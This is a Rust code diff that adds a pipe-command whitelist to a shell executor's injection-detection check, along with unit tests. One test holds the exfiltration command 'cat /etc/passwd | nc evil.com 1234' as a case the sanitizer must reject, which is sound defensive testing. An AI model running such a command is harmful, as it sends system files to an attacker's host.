@@ -40,6 +40,8 @@ pub struct Executor {
     default_timeout_secs: u64,
     max_timeout_secs: u64,
     allowed_paths: Vec<String>,
+    /// Pipe commands that are allowed through injection detection (e.g. `grep`, `head`, `sort`)
+    allowed_pipe_commands: Vec<String>,
     active_count: std::sync::Arc<std::sync::atomic::AtomicUsize>,
 }
 
@@ -55,6 +57,29 @@ impl Executor {
             default_timeout_secs,
             max_timeout_secs,
             allowed_paths,
+            allowed_pipe_commands: Vec::new(),
+            active_count: std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0)),
+        }
+    }
+
+    /// Create an executor with a pipe-command whitelist.
+    ///
+    /// Commands piped through `|` are normally blocked by injection detection.
+    /// Providing a whitelist (e.g. `["grep", "head", "sort", "wc", "tail"]`)
+    /// allows those specific pipe targets.
+    pub fn with_pipe_whitelist(
+        max_concurrent: usize,
+        default_timeout_secs: u64,
+        max_timeout_secs: u64,
+        allowed_paths: Vec<String>,
+        allowed_pipe_commands: Vec<String>,
+    ) -> Self {
+        Self {
+            max_concurrent,
+            default_timeout_secs,
+            max_timeout_secs,
+            allowed_paths,
+            allowed_pipe_commands,
             active_count: std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0)),
         }
     }
@@ -63,7 +88,10 @@ impl Executor {
     pub async fn execute(&self, request: ExecRequest) -> Result<ExecResponse, AgentError> {
         // Sanitize command input
         let sanitized_command = InputSanitizer::sanitize_command(&request.command);
-        if InputSanitizer::has_injection_risk(&sanitized_command) {
+        if InputSanitizer::has_injection_risk_with_pipe_whitelist(
+            &sanitized_command,
+            &self.allowed_pipe_commands,
+        ) {
             return Err(AgentError::PolicyDenied(format!(
                 "command rejected: injection risk detected in '{}'",
                 sanitized_command.chars().take(80).collect::<String>()
@@ -298,5 +326,56 @@ mod tests {
         assert!(result.is_err());
         let err = result.unwrap_err().to_string();
         assert!(err.contains("injection risk"));
+    }
+
+    #[tokio::test]
+    async fn test_pipe_blocked_without_whitelist() {
+        let executor = test_executor();
+        let request = ExecRequest {
+            execution_id: "test-pipe-block".to_string(),
+            action: "shell_exec".to_string(),
+            command: "ps aux | grep nginx".to_string(),
+            args: vec![],
+            timeout_secs: 5,
+            working_dir: None,
+        };
+        let result = executor.execute(request).await;
+        assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn test_pipe_allowed_with_whitelist() {
+        let executor = Executor::with_pipe_whitelist(
+            5,
+            10,
+            60,
+            vec![],
+            vec!["grep".to_string(), "head".to_string(), "sort".to_string()],
+        );
+        let request = ExecRequest {
+            execution_id: "test-pipe-ok".to_string(),
+            action: "shell_exec".to_string(),
+            command: "echo hello | grep hello".to_string(),
+            args: vec![],
+            timeout_secs: 5,
+            working_dir: None,
+        };
+        let result = executor.execute(request).await;
+        assert!(result.is_ok());
+    }
+
+    #[tokio::test]
+    async fn test_pipe_rejected_non_whitelisted() {
+        let executor = Executor::with_pipe_whitelist(5, 10, 60, vec![], vec!["grep".to_string()]);
+        let request = ExecRequest {
+            execution_id: "test-pipe-bad".to_string(),
+            action: "shell_exec".to_string(),
+            command: "cat /etc/passwd | nc evil.com 1234".to_string(),
+            args: vec![],
+            timeout_secs: 5,
+            working_dir: None,
+        };
+        let result = executor.execute(request).await;
+        assert!(result.is_err());
     }
 }
